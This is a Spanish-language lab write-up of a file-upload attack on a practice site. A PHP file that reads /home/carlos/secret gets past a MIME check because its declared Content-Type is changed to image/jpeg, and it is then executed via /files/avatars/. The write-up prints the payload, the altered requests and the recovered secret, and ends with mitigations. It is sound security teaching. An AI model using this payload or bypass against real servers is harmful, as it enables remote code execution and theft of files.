@@ -1,0 +1,265 @@
+# Web Shell Upload vía validación MIME
+
+## 1. Resumen
+
+La aplicación permite a los usuarios autenticados subir una imagen como avatar. El servidor intenta restringir los archivos permitidos comprobando el tipo MIME indicado en la petición `multipart/form-data`.
+
+La vulnerabilidad consiste en que esta validación se basa únicamente en el valor del encabezado `Content-Type` de la parte correspondiente al archivo, sin verificar realmente que el contenido sea una imagen.
+
+Esto permite subir un archivo PHP malicioso indicando un MIME permitido, como `image/jpeg`. Posteriormente, el archivo puede solicitarse directamente mediante `/files/avatars/`, provocando que el servidor lo interprete como código PHP y ejecute su contenido.
+
+En el laboratorio, esto permite leer `/home/carlos/secret`.
+
+---
+
+## 2. Identificación de la funcionalidad vulnerable
+
+Después de iniciar sesión, se accede a la sección **My Account**, donde existe una funcionalidad para subir un avatar.
+
+Al subir una imagen legítima, Burp Suite permite observar posteriormente una petición similar a:
+
+```http
+GET /files/avatars/avatar.jpg HTTP/2
+Host: 0aae00d4035461f880bbccb2004b0094.web-security-academy.net
+```
+
+Esto revela que los avatares subidos quedan almacenados bajo:
+
+```text
+/files/avatars/
+```
+
+Por tanto, además de comprobar cómo se realiza la subida, es importante comprobar si los archivos almacenados pueden ser interpretados como código ejecutable.
+
+---
+
+## 3. Creación del archivo malicioso
+
+Se crea un archivo denominado:
+
+```text
+exploit.php
+```
+
+con el siguiente contenido:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+El objetivo del archivo es leer el secreto del usuario Carlos y devolverlo directamente en la respuesta HTTP.
+
+---
+
+## 4. Primera prueba de subida
+
+Se intenta subir `exploit.php` utilizando normalmente el formulario de avatar.
+
+Burp muestra que la aplicación envía el archivo con:
+
+```http
+Content-Type: application/x-php
+```
+
+El servidor responde:
+
+```http
+HTTP/2 403 Forbidden
+```
+
+y:
+
+```text
+Sorry, file type application/x-php is not allowed
+Only image/jpeg and image/png are allowed
+```
+
+Esto confirma que existe una validación del MIME del archivo.
+
+Sin embargo, todavía no sabemos si el servidor comprueba realmente el contenido del archivo o simplemente confía en el MIME proporcionado por el cliente.
+
+---
+
+## 5. Manipulación del Content-Type
+
+Se localiza en **Proxy > HTTP history** la petición:
+
+```http
+POST /my-account/avatar
+```
+
+y se envía a **Burp Repeater**.
+
+Dentro de la sección correspondiente al archivo se encuentra:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+```
+
+Se modifica únicamente el MIME declarado:
+
+```http
+Content-Type: image/jpeg
+```
+
+El contenido del archivo continúa siendo:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+La petición queda conceptualmente así:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+---
+
+## 6. Resultado de la subida
+
+Al enviar la petición modificada, el servidor responde:
+
+```http
+HTTP/2 200 OK
+```
+
+con:
+
+```text
+The file avatars/exploit.php has been uploaded.
+```
+
+Esto demuestra que la aplicación acepta el archivo simplemente porque el MIME declarado es `image/jpeg`.
+
+El servidor no está comprobando que el contenido corresponda realmente a una imagen.
+
+---
+
+## 7. Ejecución del archivo
+
+A continuación, se utiliza la petición que originalmente servía el avatar:
+
+```http
+GET /files/avatars/<YOUR-IMAGE>
+```
+
+y se modifica la ruta para solicitar:
+
+```http
+GET /files/avatars/exploit.php HTTP/2
+```
+
+El servidor procesa el archivo `.php` como código PHP.
+
+La respuesta devuelve directamente el contenido del secreto:
+
+```text
+JeXC8iattcUbNsmc8SX0F5UYfIef934h
+```
+
+Por tanto, se confirma que el archivo subido no solamente se almacena en el servidor, sino que además puede ejecutarse.
+
+---
+
+## 8. Impacto
+
+La vulnerabilidad permite a un atacante autenticado subir archivos que contienen código ejecutable y posteriormente ejecutarlos mediante una petición HTTP.
+
+Dependiendo de los permisos del proceso que ejecuta PHP, esto puede permitir:
+
+* Ejecución arbitraria de código en el servidor.
+* Lectura de archivos locales.
+* Acceso a información sensible.
+* Manipulación de archivos accesibles por el proceso web.
+* Compromiso parcial o total de la aplicación.
+
+En este laboratorio, la explotación se utiliza para leer:
+
+```text
+/home/carlos/secret
+```
+
+---
+
+## 9. Causa raíz
+
+La causa principal es una validación insegura del tipo de archivo.
+
+La aplicación confía en el encabezado:
+
+```http
+Content-Type: image/jpeg
+```
+
+enviado por el cliente.
+
+Este valor es completamente controlable por el atacante y no demuestra que el archivo sea realmente una imagen.
+
+Además, existe una segunda condición importante: los archivos subidos son accesibles desde una ruta donde el servidor puede interpretar archivos PHP como código ejecutable.
+
+La combinación de ambas condiciones hace posible el ataque:
+
+```text
+Archivo PHP
+     ↓
+MIME falso: image/jpeg
+     ↓
+Validación superada
+     ↓
+exploit.php almacenado
+     ↓
+/files/avatars/exploit.php
+     ↓
+Servidor interpreta PHP
+     ↓
+Ejecución de código
+```
+
+---
+
+## 10. Mitigación
+
+La aplicación no debería confiar únicamente en el `Content-Type` proporcionado por el cliente.
+
+Se deberían aplicar varias medidas:
+
+1. **Validar realmente el contenido del archivo**, utilizando detección del tipo MIME basada en los bytes del archivo.
+
+2. **Comprobar la estructura del archivo** para garantizar que realmente corresponde a una imagen válida.
+
+3. **Renombrar los archivos subidos** utilizando identificadores generados por el servidor, evitando conservar extensiones potencialmente ejecutables.
+
+4. **Almacenar los archivos fuera del directorio servido directamente por el servidor web**, cuando sea posible.
+
+5. **Deshabilitar la ejecución de código** dentro del directorio destinado a uploads.
+
+6. Aplicar una **lista blanca de extensiones permitidas** como defensa adicional, aunque la extensión por sí sola tampoco debe considerarse una validación suficiente.
+
+7. Aplicar controles de permisos adecuados para que el proceso web tenga el mínimo acceso necesario.
+
+---
+
+## 11. Conclusión
+
+El laboratorio demuestra una vulnerabilidad clásica de **Unrestricted File Upload** causada por una validación MIME insuficiente.
+
+La aplicación parecía impedir la subida de archivos PHP, pero la comprobación podía evadirse modificando:
+
+```http
+Content-Type: application/x-php
+```
+
+a:
+
+```http
+Content-Type: image/jpeg
+```
+
+El servidor aceptaba entonces el archivo PHP y lo almacenaba bajo `/files/avatars/`. Al solicitar posteriormente `exploit.php`, el servidor ejecutaba el código PHP contenido en el archivo, permitiendo obtener el secreto de Carlos.
+
+La lección principal es que **el `Content-Type` enviado por el cliente no debe utilizarse como única fuente de confianza para determinar el tipo real de un archivo**.
